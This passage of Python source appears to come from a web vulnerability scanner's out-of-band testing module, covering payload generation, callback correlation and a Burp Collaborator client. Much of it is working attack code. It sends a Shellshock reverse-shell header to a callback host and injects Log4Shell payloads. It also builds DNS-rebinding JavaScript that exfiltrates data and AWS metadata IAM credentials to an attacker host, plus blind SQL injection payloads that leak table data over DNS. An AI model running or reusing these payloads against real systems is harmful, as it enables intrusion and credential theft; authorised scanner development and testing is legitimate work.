        self._ftp = OASTFTPChannel(self.oob_domain)
        self._ldap = OASTLDAPChannel(self.oob_domain)

    def all_payloads(self, token: str) -> Dict[str, List[str]]:
        """Returns all protocol payloads keyed by protocol name.

        Includes DNS/HTTP/SMTP/FTP/LDAP/Log4Shell payloads plus:
        - dns_rebinding: rbndr.us and 1u.ms alternating-DNS attack domains
          (via DNSRebindingAttacker)
        - dns_exfil: base32-encoded probe chunks for OOB data exfiltration
          (via OASTDataExfiltrator)
        """
        host = f"{token}.{self.oob_domain}"
        payloads: Dict[str, List[str]] = {
            "dns": [host],
            "http": [f"http://{host}/", f"https://{host}/"],
            "smtp": self._smtp.smtp_injection_payloads(token),
            "ftp": self._ftp.payloads(token),
            "ldap": self._ldap.payloads(token),
            "log4shell": self._ldap.log4shell_payloads(token),
            "xxe_ftp": [self._ftp.xxe_entity(token)],
        }

        # DNS rebinding payloads (DNSRebindingAttacker — defined later in this module)
        _dns_rb_cls = globals().get("DNSRebindingAttacker")
        if _dns_rb_cls is not None:
            try:
                _rb = _dns_rb_cls(attacker_ip="", target_ip="127.0.0.1")
                payloads["dns_rebinding"] = [_rb.rbndr_us_domain(), _rb.one_u_ms_domain()]
            except Exception as _fix_e:
                _logger.debug(f"[core.oast] {type(_fix_e).__name__}: {_fix_e!r}")

        # DNS exfil probe queries (OASTDataExfiltrator — defined later in this module)
        _exfil_cls = globals().get("OASTDataExfiltrator")
        if _exfil_cls is not None and self.oob_domain:
            try:
                _exfil = _exfil_cls(self.oob_domain, encoding="base32")
                probe = f"oast-probe:{token}".encode("utf-8")
                payloads["dns_exfil"] = _exfil.build_dns_exfil_queries(probe, token)[:3]
            except Exception as _fix_e:
                _logger.debug(f"[core.oast] {type(_fix_e).__name__}: {_fix_e!r}")

        return payloads

    def inject_header(self, url: str, token: str) -> List[Dict[str, Any]]:
        """Inject OOB payloads into common HTTP headers."""
        if not self._session:
            return []
        results = []
        host = f"{token}.{self.oob_domain}"
        headers_to_inject = {
            "X-Forwarded-For": host,
            "X-Forwarded-Host": host,
            "Referer": f"http://{host}/",
            "User-Agent": f"(){{}};/bin/bash -i >& /dev/tcp/{host}/80 0>&1",
            "X-Custom-IP-Authorization": host,
            "X-Original-URL": f"http://{host}/",
            "True-Client-IP": host,
        }
        for hdr, val in headers_to_inject.items():
            try:
                r = self._session.get(url, headers={hdr: val}, timeout=6, verify=False)
                results.append({"header": hdr, "value": val, "status": r.status_code})
            except Exception as _fix_e:
                _logger.debug(f"[core.oast] {type(_fix_e).__name__}: {_fix_e!r}")
        return results

    def inject_log4shell(self, url: str, token: str) -> List[Dict[str, Any]]:
        """Inject Log4Shell payloads into HTTP headers."""
        if not self._session:
            return []
        results = []
        payloads = self._ldap.log4shell_payloads(token)
        inject_headers = ["User-Agent", "X-Api-Version", "X-Forwarded-For", "Referer", "Accept-Language"]
        for header in inject_headers:
            for payload in payloads[:2]:  # first 2 variants per header
                try:
                    r = self._session.get(url, headers={header: payload}, timeout=6, verify=False)
                    results.append({"header": header, "payload": payload, "status": r.status_code})
                except Exception as _fix_e:
                    _logger.debug(f"[core.oast] {type(_fix_e).__name__}: {_fix_e!r}")
        return results


# ---------------------------------------------------------------------------
# 2. OOB Correlation Engine
# ---------------------------------------------------------------------------

class OASTCorrelationEngine:
    """
    Maps injection tokens -> (payload, endpoint, param, inject_ts)
    and correlates with OAST callback events to produce confirmed findings.

    Provides timing analysis: latency between injection and callback via
    OASTTimingAnalyzer (statistical aggregation of per-protocol latencies).
    """

    def __init__(self):
        self._injections: Dict[str, Dict[str, Any]] = {}
        self._events: List[Dict[str, Any]] = []
        self._lock = threading.Lock()
        # OASTTimingAnalyzer — initialized lazily (defined later in this module)
        self._timing: Optional[Any] = None

    # -- Registration API --

    def record_injection(
        self,
        token: str,
        *,
        payload: str = "",
        endpoint: str = "",
        param: str = "",
        protocol: str = "http",
        extra: Optional[Dict[str, Any]] = None,
    ) -> None:
        with self._lock:
            self._injections[token] = {
                "token": token,
                "payload": payload,
                "endpoint": endpoint,
                "param": param,
                "protocol": protocol,
                "inject_ts": time.time(),
                **(extra or {}),
            }

    # -- Correlation API --

    def correlate_event(self, event: Dict[str, Any]) -> Optional[Dict[str, Any]]:
        """Match an OAST event to a recorded injection. Returns enriched finding or None."""
        with self._lock:
            tok = str(
                event.get("token")
                or event.get("unique-id")
                or event.get("unique_id")
                or ""
            )
            injection = self._injections.get(tok)
            if not injection:
                # Try substring search in raw request
                raw = str(event.get("raw-request") or event.get("request") or "")
                for t, inj in self._injections.items():
                    # Word-boundary check prevents token substring false matches
                    if t and t in raw.split():
                        tok, injection = t, inj
                        break
            if not injection:
                return None

            callback_ts = time.time()
            inject_ts = injection.get("inject_ts", callback_ts)
            latency_ms = round((callback_ts - inject_ts) * 1000, 1)
            protocol_detected = event.get("protocol", injection.get("protocol", "unknown"))

            # Record timing via OASTTimingAnalyzer (lazy init — class defined later in module)
            if self._timing is None:
                _ta_cls = globals().get("OASTTimingAnalyzer")
                if _ta_cls is not None:
                    self._timing = _ta_cls()
            if self._timing is not None:
                try:
                    self._timing.record(
                        tok, inject_ts=inject_ts, callback_ts=callback_ts,
                        protocol=protocol_detected,
                    )
                except Exception as _fix_e:
                    _logger.debug(f"[core.oast] {type(_fix_e).__name__}: {_fix_e!r}")

            finding = {
                **injection,
                "verified": True,
                "oast_event": event,
                "callback_ts": callback_ts,
                "latency_ms": latency_ms,
                "protocol_detected": protocol_detected,
                "remote_address": event.get("remote-address", event.get("remote_address", "")),
                "severity": "High",
                "confidence": 1.0,
                "confidence_label": "Confirmed",
            }
            self._events.append(finding)
            return finding

    def correlate_batch(self, events: List[Dict[str, Any]]) -> List[Dict[str, Any]]:
        return [f for ev in events for f in [self.correlate_event(ev)] if f]

    def get_unmatched_injections(self, min_age_s: float = 30.0) -> List[Dict[str, Any]]:
        """Return injections with no callback yet (potential false negatives)."""
        now = time.time()
        with self._lock:
            matched_tokens = {ev["token"] for ev in self._events}
            return [
                inj for tok, inj in self._injections.items()
                if tok not in matched_tokens and (now - inj.get("inject_ts", now)) >= min_age_s
            ]

    def summary(self) -> Dict[str, Any]:
        with self._lock:
            base = {
                "injections_total": len(self._injections),
                "callbacks_received": len(self._events),
                "avg_latency_ms": (
                    round(sum(e.get("latency_ms", 0) for e in self._events) / len(self._events), 1)
                    if self._events else None
                ),
            }
            # Include OASTTimingAnalyzer statistical breakdown if available
            if self._timing is not None:
                try:
                    base["timing_analysis"] = self._timing.analyze()
                except Exception as _fix_e:
                    _logger.debug(f"[core.oast] {type(_fix_e).__name__}: {_fix_e!r}")
            return base


# ---------------------------------------------------------------------------
# 3. OAST Timing Analyzer
# ---------------------------------------------------------------------------

class OASTTimingAnalyzer:
    """
    Statistical timing analysis of OOB callbacks.
    Useful for: blind SQLi timing detection, DNS exfil latency, WAF detection.
    """

    def __init__(self):
        self._records: List[Dict[str, Any]] = []

    def record(self, token: str, inject_ts: float, callback_ts: float, protocol: str = "dns") -> None:
        latency_ms = round((callback_ts - inject_ts) * 1000, 1)
        self._records.append({
            "token": token, "inject_ts": inject_ts,
            "callback_ts": callback_ts, "latency_ms": latency_ms,
            "protocol": protocol,
        })

    def analyze(self) -> Dict[str, Any]:
        if not self._records:
            return {"samples": 0}
        latencies = [r["latency_ms"] for r in self._records]
        latencies_sorted = sorted(latencies)
        n = len(latencies_sorted)
        mean_ms = sum(latencies_sorted) / n
        median_ms = latencies_sorted[n // 2]
        p95_ms = latencies_sorted[int(n * 0.95)]
        variance = sum((x - mean_ms) ** 2 for x in latencies_sorted) / n
        stddev = variance ** 0.5
        by_proto: Dict[str, List[float]] = {}
        for r in self._records:
            by_proto.setdefault(r["protocol"], []).append(r["latency_ms"])
        return {
            "samples": n,
            "min_ms": latencies_sorted[0],
            "max_ms": latencies_sorted[-1],
            "mean_ms": round(mean_ms, 1),
            "median_ms": round(median_ms, 1),
            "p95_ms": round(p95_ms, 1),
            "stddev_ms": round(stddev, 1),
            "by_protocol": {k: round(sum(v) / len(v), 1) for k, v in by_proto.items()},
            "interpretation": (
                "Anormal gecikme — WAF/güvenlik duvarı filtrelemesi olabilir"
                if stddev > 5000
                else "Normal OOB gecikme örüntüsü"
            ),
        }


# ---------------------------------------------------------------------------
# 4. DNS Rebinding Attacker
# ---------------------------------------------------------------------------

class DNSRebindingAttacker:
    """
    DNS rebinding attack automation.

    Phase 1: Victim browser resolves attacker domain -> attacker IP (serves JS)
    Phase 2: DNS TTL expires; attacker domain now resolves -> target internal IP
    Phase 3: Browser JS makes same-origin requests to internal service

    Generates attack payloads and instructions for common rebinding services.
    """

    _REBINDING_SERVICES = [
        "rbndr.us",       # {hex_ip_a}.{hex_ip_b}.rbndr.us alternates A/B
        "1u.ms",          # {ip_a}-{ip_b}.1u.ms
        "rebind.it",      # manual
        "nip.io",         # direct IP embed (not rebinding, but useful)
        "sslip.io",       # direct IP embed with SSL
    ]

    def __init__(self, attacker_ip: str = "", target_ip: str = "127.0.0.1"):
        self.attacker_ip = attacker_ip or "ATTACKER_IP"
        self.target_ip = target_ip

    def _ip_to_hex(self, ip: str) -> str:
        try:
            packed = _socket.inet_aton(ip)
            return packed.hex()
        except Exception as exc:
            _logger.warning("[DNSRebinding] IP to hex failed for %r: %s", ip, exc)
            return ip.replace(".", "-")

    def rbndr_us_domain(self) -> str:
        """Generate rbndr.us domain that alternates between attacker and target."""
        a_hex = self._ip_to_hex(self.attacker_ip)
        b_hex = self._ip_to_hex(self.target_ip)
        return f"{a_hex}.{b_hex}.rbndr.us"

    def one_u_ms_domain(self) -> str:
        """Generate 1u.ms domain."""
        a = self.attacker_ip.replace(".", "-")
        b = self.target_ip.replace(".", "-")
        return f"{a}-{b}.1u.ms"

    def attack_payloads(self, internal_port: int = 80) -> List[Dict[str, Any]]:
        """Generate DNS rebinding attack instructions."""
        rbndr = self.rbndr_us_domain()
        one_u = self.one_u_ms_domain()
        return [
            {
                "service": "rbndr.us",
                "domain": rbndr,
                "attack_url": f"http://{rbndr}:{internal_port}/",
                "description": "Alternates DNS between attacker and target IP (low TTL)",
                "js_payload": (
                    f"fetch('http://{rbndr}:{internal_port}/api/v1/metadata')"
                    f".then(r=>r.text()).then(d=>fetch('http://attacker/exfil?d='+btoa(d)))"
                ),
            },
            {
                "service": "1u.ms",
                "domain": one_u,
                "attack_url": f"http://{one_u}:{internal_port}/",
                "description": "Round-robin DNS rebinding via 1u.ms",
                "js_payload": (
                    f"fetch('http://{one_u}:{internal_port}/')"
                    f".then(r=>r.text()).then(d=>navigator.sendBeacon('http://attacker/c',d))"
                ),
            },
        ]

    def cloud_metadata_attack(self) -> Dict[str, Any]:
        """DNS rebinding targeting AWS IMDSv1 metadata (169.254.169.254)."""
        self.target_ip = "169.254.169.254"
        rbndr = self.rbndr_us_domain()
        return {
            "type": "dns_rebinding_aws_imds",
            "domain": rbndr,
            "target": "169.254.169.254",
            "attack_url": f"http://{rbndr}/latest/meta-data/",
            "js_exfil": (
                f"fetch('http://{rbndr}/latest/meta-data/iam/security-credentials/')"
                ".then(r=>r.text()).then(role=>fetch(`http://"
                f"{rbndr}/latest/meta-data/iam/security-credentials/${{role}}`)"
                ".then(r=>r.text()).then(creds=>fetch('http://attacker/exfil?c='+btoa(creds))))"
            ),
            "severity": "Critical",
            "description": "DNS rebinding to extract AWS IMDSv1 credentials from browser",
        }


# ---------------------------------------------------------------------------
# 5. OOB Data Exfiltrator (DNS TXT base32/hex)
# ---------------------------------------------------------------------------

class OASTDataExfiltrator:
    """
    DNS TXT-based out-of-band data exfiltration.

    Encodes arbitrary data as base32 or hex chunks and generates
    DNS query sequences that leak data to an OOB DNS listener.

    Encoding: base32 (RFC 4648, DNS-safe alphabet) or hex.
    Each DNS label: max 63 chars. Total FQDN: max 253 chars.
    """

    _MAX_LABEL = 60   # conservative (leave room for index prefix)
    _MAX_FQDN = 240   # conservative

    def __init__(self, oob_domain: str, encoding: str = "base32"):
        self.oob_domain = oob_domain.strip(".")
        self.encoding = encoding.lower()

    def encode(self, data: bytes) -> str:
        if self.encoding == "base32":
            return base64.b32encode(data).decode("ascii").lower().rstrip("=")
        elif self.encoding == "hex":
            return data.hex()
        else:
            return base64.b64encode(data).decode("ascii").replace("+", "-").replace("/", "_").rstrip("=")

    def decode(self, encoded: str) -> bytes:
        if self.encoding == "base32":
            padded = encoded.upper() + "=" * (-len(encoded) % 8)
            return base64.b32decode(padded)
        elif self.encoding == "hex":
            return bytes.fromhex(encoded)
        else:
            padded = encoded.replace("-", "+").replace("_", "/") + "==="
            return base64.b64decode(padded[:len(padded) - len(padded) % 4])

    def build_dns_exfil_queries(self, data: bytes, token: str) -> List[str]:
        """
        Splits data into DNS-label-sized chunks.
        Each query: {index}.{chunk}.{token}.{oob_domain}
        """
        encoded = self.encode(data)
        chunk_size = self._MAX_LABEL - 6  # room for "N." prefix + dot
        chunks = [encoded[i:i+chunk_size] for i in range(0, len(encoded), chunk_size)]
        queries = []
        total = len(chunks)
        for i, chunk in enumerate(chunks):
            label = f"{i:02d}of{total:02d}.{chunk}.{token}.{self.oob_domain}"
            if len(label) <= self._MAX_FQDN:
                queries.append(label)
        return queries

    def decode_received_chunks(self, queries: List[str]) -> bytes:
        """Reconstruct data from received DNS queries (sorted by index)."""
        chunks: Dict[int, str] = {}
        for q in queries:
            parts = q.split(".")
            if len(parts) >= 3:
                idx_part = parts[0]
                chunk = parts[1]
                try:
                    idx = int(idx_part.split("of")[0])
                    chunks[idx] = chunk
                except ValueError as _fix_e:
                    _logger.debug(f"[core.oast] {type(_fix_e).__name__}: {_fix_e!r}")
        ordered = [chunks[k] for k in sorted(chunks)]
        return self.decode("".join(ordered))

    def sqli_dns_exfil_payload(self, column: str, table: str, token: str) -> Dict[str, str]:
        """Generate DNS exfil payloads for blind SQLi (MySQL / MSSQL / PostgreSQL)."""
        host = f"{token}.{self.oob_domain}"
        return {
            "mysql": (
                f"' AND (SELECT LOAD_FILE(CONCAT('\\\\\\\\', ({column} FROM {table} LIMIT 1), "
                f"'.{host}\\\\x')))-- -"
            ),
            "mssql": (
                f"'; DECLARE @r NVARCHAR(MAX)=({column} FROM {table}); "
                f"EXEC master..xp_dirtree '\\\\'+@r+'.{host}\\x'-- -"
            ),
            "oracle": (
                f"' AND (SELECT UTL_HTTP.REQUEST('http://'||({column} FROM {table})||'.{host}/') FROM DUAL)-- -"
            ),
        }


# ---------------------------------------------------------------------------
# 6. Scanner Integration Mixin
# ---------------------------------------------------------------------------

class OASTScannerMixin:
    """
    Mixin for BaseScanner subclasses to easily use OAST OOB callbacks.

    Usage in scanner:
        class MyScanner(OASTScannerMixin, BaseScanner):
            def run(self, target, **kwargs):
                tok = self.oast_new_token(endpoint=target, param="q")
                payloads = self.oast_payloads(tok)
                # inject payloads["http"][0] or payloads["dns"][0]
                ...
                events = self.oast_poll(tok, wait=15)
                findings = self.oast_correlate(events)
    """

    # Expected to be set by the owning Scanner or injected via __init__
    _oast_client: Optional["OASTClient"] = None
    _oast_correlation: Optional[OASTCorrelationEngine] = None

    def _ensure_oast(self) -> bool:
        if self._oast_client is None:
            # Try to grab global poller client
            poller = get_oast_poller()
            if poller:
                self._oast_client = poller._client
        if self._oast_correlation is None:
            self._oast_correlation = OASTCorrelationEngine()
        return self._oast_client is not None

    def oast_new_token(
        self,
        endpoint: str = "",
        param: str = "",
        protocol: str = "http",
        payload: str = "",
    ) -> str:
        tok = gen_token("ws")
        if self._oast_correlation is None:
            self._oast_correlation = OASTCorrelationEngine()
        self._oast_correlation.record_injection(
            tok, endpoint=endpoint, param=param, protocol=protocol, payload=payload
        )
        return tok

    def oast_payloads(self, token: str) -> Dict[str, List[str]]:
        """Return all protocol payloads for a given token."""
        if not self._ensure_oast():
            domain = "oast.example.com"
        else:
            cfg = getattr(self._oast_client, "cfg", None)
            domain = getattr(cfg, "root_domain", "") if cfg else ""
            domain = domain or "oast.example.com"
        mp = OASTMultiProtocolProber(self._oast_client, oob_domain=domain)
        return mp.all_payloads(token)

    def oast_poll(self, token: str, wait: float = 15.0) -> List[Dict[str, Any]]:
        """Poll for OAST events for the given token."""
        if not self._ensure_oast():
            return []
        try:
            return poll_events_sync(self._oast_client, [token], timeout=int(wait + 5))
        except Exception:
            return []

    def oast_correlate(self, events: List[Dict[str, Any]]) -> List[Dict[str, Any]]:
        """Correlate polled events to injections. Returns confirmed findings."""
        if self._oast_correlation is None:
            return []
        return self._oast_correlation.correlate_batch(events)

    def oast_summary(self) -> Dict[str, Any]:
        if self._oast_correlation is None:
            return {}
        return self._oast_correlation.summary()


# ---------------------------------------------------------------------------
# 7. Enhanced CollaboratorClient (Burp Collaborator compat)
# ---------------------------------------------------------------------------

class EnhancedCollaboratorClient(_BaseOSAT, IOSATClient):
    """
    Burp Collaborator-compatible OAST client.
    Polls {api_url}/burpresults?biid={biid} for DNS/HTTP/SMTP interactions.
    Also supports OAST.pro and other Collaborator-compatible servers.
    """

    def __init__(self, cfg: OSATConfig):
        super().__init__(cfg)
        self._biid: Optional[str] = None
        self._registered = False

    async def _ensure_registered(self) -> None:
        if self._registered:
            return
        base = (self.cfg.api_url or "").rstrip("/")
        if not base:
            return
        try:
            r = await self._client.get(f"{base}/burpresults", timeout=httpx.Timeout(10))
            if r.status_code == 200:
                data = r.json() or {}
                self._biid = str(data.get("biid") or data.get("id") or uuid.uuid4().hex[:16])
                self._registered = True
        except Exception as e:
            _logger.debug(f"[Collaborator] Registration failed: {e}")
            self._biid = uuid.uuid4().hex[:16]
            self._registered = True

    async def new_token(self) -> str:
        await self._ensure_registered()
        sub = uuid.uuid4().hex[:8]
        if self._biid:
            return f"{sub}.{self._biid}"
        return gen_token("collab")

    def payloads_for(self, token: str) -> Dict[str, List[str]]:
        base = (self.cfg.api_url or "").rstrip("/")
        domain = base.replace("https://", "").replace("http://", "") or self.cfg.root_domain
        return build_payloads(domain, token)

    async def poll_async(self, interested_tokens: Iterable[str]) -> List[Dict[str, Any]]:
        await self._ensure_registered()
        base = (self.cfg.api_url or "").rstrip("/")
        if not base or not self._biid:
            return []
        tokens = set(interested_tokens or [])
        found: List[Dict[str, Any]] = []
        try:
            r = await self._client.get(
                f"{base}/burpresults",
                params={"biid": self._biid},
                timeout=httpx.Timeout(15),
            )
            if r.status_code == 200:
                data = r.json() or {}
                for ev in data.get("responses") or []:
                    client_data = str(ev.get("clientAddress") or "")
                    type_ = str(ev.get("type") or "dns").lower()
                    tok_match = next((t for t in tokens if t in str(ev)), "")
                    if tok_match:
                        found.append({
                            "token": tok_match,
                            "protocol": type_,
                            "remote_address": client_data,
                            "ts": ev.get("time"),
                            "raw": ev,
                        })
        except Exception as e:
            _logger.debug(f"[Collaborator] Poll error: {e}")
        return found
